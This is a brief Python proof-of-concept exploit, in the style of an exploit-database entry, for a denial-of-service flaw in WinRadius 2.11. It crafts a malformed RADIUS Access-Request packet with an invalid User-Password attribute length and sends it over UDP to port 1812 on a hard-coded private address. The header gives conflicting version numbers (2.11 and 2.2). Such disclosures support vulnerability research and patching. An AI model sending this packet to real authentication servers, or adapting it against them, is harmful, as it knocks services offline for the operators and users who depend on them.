#!/usr/bin/python
 
 
#Exploit Title: WinRadius 2.11 DoS
#Date: 10th June 2013
#Exploit Author: npn
#Exploit Author Homepage: http://www.iodigitalsec.com/
#Exploit Author Write Up: http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-winradius-2-11/
#Vendor Homepage: [ADVERT HOLDING PAGE] http://www.itconsult2000.com/
#Software Link: http://download.cnet.com/WinRadius/3000-2085_4-10131429.html
#Version: 2.2
#Tested on: Windows XP SP3 English
 
 
from socket import *
import sys
import select
 
pwn =  "\x01" #Code 01
pwn += "\xff" #packet identifier
pwn += "\x00\x2c" #len 44
pwn += "\xd1\x56\x8a\x38\xfb\xea\x4a\x40\xb7\x8a\xa2\x7a\x8f\x3e\xae\x23" #authenticator
pwn += "\x01" #t=User-Name(1)
pwn += "\x06" #avp: l=6
pwn += "\x61\x64\x61\x6d" #adam
 
pwn += "\x02" #avp t=User-Password(2)
pwn += "\xff" #avp: l=18
pwn += "\xf0\x13\x57\x7e\x48\x1e\x55\xaa\x7d\x29\x6d\x7a\x88\x18\x89\x21" #password (enc)
 
address = ('192.168.200.20', 1812)
server_socket = socket(AF_INET, SOCK_DGRAM)
 
server_socket.sendto(pwn, address)
